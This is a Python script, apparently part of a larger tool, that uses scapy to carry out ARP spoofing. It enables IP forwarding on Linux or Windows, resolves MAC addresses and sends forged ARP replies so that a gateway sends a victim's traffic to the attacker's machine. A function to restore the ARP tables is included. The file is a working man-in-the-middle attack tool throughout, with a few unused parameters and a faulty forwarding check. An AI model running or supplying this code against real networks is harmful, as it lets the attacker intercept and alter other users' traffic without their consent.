#!/usr/bin/env python

from scapy.all import Ether, ARP, srp, send
import os
from helpers.win_service import WService
from helpers.term_support import headers, pprint

IPV4_PROC_ENTRY = "/proc/sys/net/ipv4/ip_forward"


def enable_linux_iproute():
    with open(IPV4_PROC_ENTRY) as f:
        if f.read() == 1:
            return
    with open(IPV4_PROC_ENTRY, "w") as f:
        f.write("1")


def disable_linux_iproute():
    with open(IPV4_PROC_ENTRY) as f:
        if f.read() == 0:
            return
    with open(IPV4_PROC_ENTRY, "w") as f:
        f.write("0")


def enable_windows_iproute():
    service = WService("RemoteAccess")
    service.start()


def disable_windows_iproute():
    service = WService("RemoteAccess")
    service.stop()


def enable_iproute(verbose=True):
    if verbose:
        pprint("Enabling IP Routing...", headers.INF)
    enable_windows_iproute() if "nt" in os.name else enable_linux_iproute()


def disable_iproute(verbose=True):
    if verbose:
        pprint("Disabling IP Routing...", headers.INF)
    disable_windows_iproute() if "nt" in os.name else disable_linux_iproute()


def get_mac(ip_addr):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_addr), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src


def spoof(gateway_ip, victim_ip, verbose=True, spoof_both=False, count=5):
    gateway_mac = get_mac(gateway_ip)
    victim_mac = get_mac(victim_ip)
    arp_resp = ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, op="is-at")
    send(arp_resp, verbose=0, count=count)
    if verbose:
        self_mac = ARP().hwsrc
        pprint(f"Sent to {gateway_ip} : {victim_ip} is-at {self_mac}", headers.SCS)


def restore(gateway_ip, victim_ip, verbose=True, restore_both=False, count=5):
    gateway_mac = get_mac(gateway_ip)
    victim_mac = get_mac(victim_ip)
    arp_resp = ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=victim_mac)
    send(arp_resp, verbose=0, count=count)
    if verbose:
        pprint(f"Sent to {gateway_ip} : {victim_ip} is-at {victim_mac}", headers.SCS)
